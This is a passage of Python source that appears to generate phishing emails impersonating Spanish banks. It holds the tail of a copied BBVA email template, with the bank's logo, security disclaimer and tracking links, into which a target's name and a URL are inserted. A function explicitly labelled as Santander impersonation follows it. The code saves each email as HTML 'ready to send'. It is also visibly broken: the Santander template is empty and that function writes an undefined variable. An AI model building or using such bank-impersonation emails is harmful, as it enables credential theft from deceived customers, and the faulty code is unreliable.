                                                        <img
                                                          alt="BBVA"
                                                          height="57"
                                                          src="https://ci3.googleusercontent.com/meips/ADKq_NYssJKc_nFP3zEX3KDizo0bLL4ArM7MI0yfNYJrkdP-Gvj3BIjvU13-fs6VG0s39Z2GVCGVPxjbSxlnmftFYbo_IQzON-p8UkTp2vU6ya1GYFcVnrMtFBTZnEM5AWeTx92-eWUbI4Uqt816JuUdvh_FBmPjqYUYOLJYFA=s0-d-e1-ft#https://image.soluciones.bbva.com/lib/fe951373746c057d73/m/3/42f19fb8-afa9-4edd-aebf-41ea557e4882.png"
                                                          width="223"
                                                          class="CToWUd"
                                                          data-bit="iit"
                                                        />
                                                      </td>
                                                    </tr>
                                                    <tr>
                                                      <td
                                                        height="30"
                                                        style="font-size: 1px; line-height: 1px"
                                                      >
                                                        &nbsp;
                                                      </td>
                                                    </tr>
                                                  </tbody>
                                                </table>
                                                <table
                                                  border="0"
                                                  cellpadding="0"
                                                  cellspacing="0"
                                                  style="border-collapse: collapse !important"
                                                  width="100%"
                                                >
                                                  <tbody>
                                                    <tr>
                                                      <td
                                                        align="center"
                                                        height="1"
                                                        style="font-size: 0; line-height: 100%"
                                                      >
                                                        <table
                                                          border="0"
                                                          cellpadding="0"
                                                          cellspacing="0"
                                                          style="
                                                            border-collapse: collapse !important;
                                                          "
                                                          width="100%"
                                                        >
                                                          <tbody>
                                                            <tr>
                                                              <td
                                                                bgcolor="#002B5A"
                                                                height="1"
                                                                style="
                                                                  font-size: 0;
                                                                  line-height: 100%;
                                                                "
                                                              >
                                                                &nbsp;
                                                              </td>
                                                            </tr>
                                                          </tbody>
                                                        </table>
                                                      </td>
                                                    </tr>
                                                  </tbody>
                                                </table>
                                              </td>
                                            </tr>
                                          </tbody>
                                        </table>
                                      </td>
                                    </tr>
                                    <tr>
                                      <td height="30" style="font-size: 1px; line-height: 1px"></td>
                                    </tr>
                                    <tr>
                                      <td align="left">
                                        <table
                                          align="left"
                                          border="0"
                                          cellpadding="0"
                                          cellspacing="0"
                                          style="border-collapse: collapse !important"
                                          width="95%"
                                        >
                                          <tbody>
                                            <tr>
                                              <td align="left" width="24"></td>
                                              <td
                                                style="
                                                  font-family: Arial, Helvetica, sans-serif;
                                                  font-size: 10px;
                                                  line-height: 12px;
                                                  color: #ffffff;
                                                  text-align: left;
                                                "
                                              >
                                                <strong>AVISO LEGAL:</strong> <br />
                                                <br />
                                                Este mensaje ha sido enviado por un sistema
                                                automático. No es preciso responder directamente a
                                                este email. <br />
                                                Por motivos de seguridad, las claves son secretas y
                                                únicamente deben ser conocidas por el propietario.
                                                <span class="il">BBVA</span> en ningún caso
                                                solicitará por correo electrónico información de
                                                claves de <span class="il">BBVA</span>.es o de
                                                tarjetas de crédito. Se recomienda comprobar siempre
                                                la dirección que aparece en la barra de navegación.
                                                Para más información sobre seguridad, consultar:
                                                <a
                                                  href="https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%2F%2Fwww.bbva.es%2Ffinanzas-vistazo%2Fciberseguridad.html%3Fcid=eml:mem::spain-cast--pie_canales-ciberseguridad-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/KUw0Buu98_BU17myHrJIk4FVwAY=340"
                                                  style="color: #ffffff; text-decoration: underline"
                                                  target="_blank"
                                                  data-saferedirecturl="https://www.google.com/url?q=https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%252F%252Fwww.bbva.es%252Ffinanzas-vistazo%252Fciberseguridad.html%253Fcid%3Deml:mem::spain-cast--pie_canales-ciberseguridad-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/KUw0Buu98_BU17myHrJIk4FVwAY%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw20RDEMXaoxrEwdcb0QBGvf"
                                                  >Aspectos relativos a la seguridad</a
                                                >
                                                <br />
                                                <br />
                                                Este mensaje, incluido cualquier archivo adjunto,
                                                pertenece de manera exclusiva al ámbito de la
                                                comunicación privada entre el Banco y el Cliente
                                                destinatario, pudiendo contener información
                                                confidencial y sujeta al secreto bancario. En caso
                                                de haber recibido este mensaje por error, se
                                                habilitan las siguientes vías para comunicarlo: a
                                                través de
                                                <a
                                                  href="https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%2F%2Fwww.bbva.es%2Fpersonas.html%3Fcid=eml:mem::spain-cast--pie_canales-home-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/d0KPzFo_AMDDhlc3m3gNHIFUIOw=340"
                                                  style="color: #ffffff; text-decoration: underline"
                                                  target="_blank"
                                                  data-saferedirecturl="https://www.google.com/url?q=https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%252F%252Fwww.bbva.es%252Fpersonas.html%253Fcid%3Deml:mem::spain-cast--pie_canales-home-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/d0KPzFo_AMDDhlc3m3gNHIFUIOw%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw2F8D-Ey3tP4X5-QYkq4pu6"
                                                  ><span class="il">bbva</span>.es</a
                                                >
                                                , @bbvaresponde, llamando al
                                                <a
                                                  href="http://xwkm5qky.r.eu-west-1.awstrack.me/L0/tel:%2B34900102801/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/R1yf70LnGuix9Soxe_gUBfcfPFc=340"
                                                  style="color: #ffffff; text-decoration: underline"
                                                  target="_blank"
                                                  data-saferedirecturl="https://www.google.com/url?q=http://xwkm5qky.r.eu-west-1.awstrack.me/L0/tel:%252B34900102801/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/R1yf70LnGuix9Soxe_gUBfcfPFc%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw3gON4d_R8WaZsPRACQdkzQ"
                                                  >900 102 801</a
                                                >
                                                (
                                                <a
                                                  href="http://xwkm5qky.r.eu-west-1.awstrack.me/L0/tel:%2B34912249426/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/kWIg1vVCsmCgjToqNFM6TDtTsxs=340"
                                                  style="color: #ffffff; text-decoration: underline"
                                                  target="_blank"
                                                  data-saferedirecturl="https://www.google.com/url?q=http://xwkm5qky.r.eu-west-1.awstrack.me/L0/tel:%252B34912249426/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/kWIg1vVCsmCgjToqNFM6TDtTsxs%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw31wrzVIg-fpSU4SzTKXbip"
                                                  >+34913747368</a
                                                >
                                                para llamadas desde el extranjero) o acudiendo a una
                                                de nuestras oficinas. <br />
                                                <br />
                                                Asimismo, informamos de que la distribución, copia o
                                                utilización de este mensaje, o de cualquier archivo
                                                adjunto al mismo, cualquiera que fuera su finalidad,
                                                están prohibidas por la ley.
                                              </td>
                                            </tr>
                                            <tr>
                                              <td
                                                height="60"
                                                style="font-size: 1px; line-height: 1px"
                                              ></td>
                                            </tr>
                                          </tbody>
                                        </table>
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                        <img
                          alt=""
                          src="https://ci3.googleusercontent.com/meips/ADKq_NYa5mFf9ZL4RDGQEQePt7zcr3P3pq9L6ANBjmTAk46Rooj_UMqomZxffy7R3XBCZSub_ph9oTNCbBCGyJ8cI_UGz2pVQ3kJEY4tD3D9XhvrE8odnoTpvfGBt34X9R9lEDm1SFHKx6HHoxZnVcjTsqBy8mqXO5k8fv_bCVaSNH2GL6Coktm0BcVYMB1_CkuY_1nDAocraaRAJX_Qa7subQ=s0-d-e1-ft#https://xwkm5qky.r.eu-west-1.awstrack.me/I0/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/VYvQD_yQ8DmIJeOEkl3u-pKEegk=340"
                          style="display: none; width: 1px; height: 1px"
                          class="CToWUd"
                          data-bit="iit"
                        />
                        <div class="yj6qo"></div>
                        <div class="adL"></div>
                      </div>
                    </html>
                   """.format(url,url))
    fileNameHtml=userName+"Office.html"
    htmlFile=open("./reportFolder/"+fileNameHtml,"w")
    htmlFile.write(officeHtml)
    htmlFile.close()
    print("HTML creado y preparado para enviar")
    getPath()


def santanderEs(userName,userEmail,url,currentDate):
    ##HTML suplantacion santander
    santanderHtml=("""
                   
                   """.format(currentDate,userEmail,userEmail,userEmail,userEmail,userEmail))
    fileNameHtml=userName+"Office.html"
    htmlFile=open("./reportFolder/"+fileNameHtml,"w")
    htmlFile.write(officeHtml)
    htmlFile.close()
    print("HTML creado y preparado para enviar")
    getPath()